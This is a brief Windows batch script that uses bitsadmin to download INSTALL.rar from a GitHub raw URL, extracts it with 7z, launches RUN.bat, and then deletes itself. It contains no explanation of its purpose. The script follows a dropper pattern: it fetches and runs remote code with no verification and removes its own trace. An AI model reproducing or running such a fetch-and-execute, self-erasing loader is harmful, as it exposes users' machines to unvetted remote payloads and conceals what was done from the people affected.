@echo off
bitsadmin.exe /transfer "LOL" /priority FOREGROUND https://raw.githubusercontent.com/bugai66/Elysium_Files/master/INSTALL.rar "%~dp0INSTALL.rar"
bitsadmin.exe /transfer "LOL" /priority FOREGROUND https://raw.githubusercontent.com/bugai66/Elysium_Files/master/INSTALL.rar "%~dp0INSTALL.rar"
"%~dp0\7z" e "INSTALL.rar"
start cmd /c "RUN.bat"
DEL "%~f0"
EXIT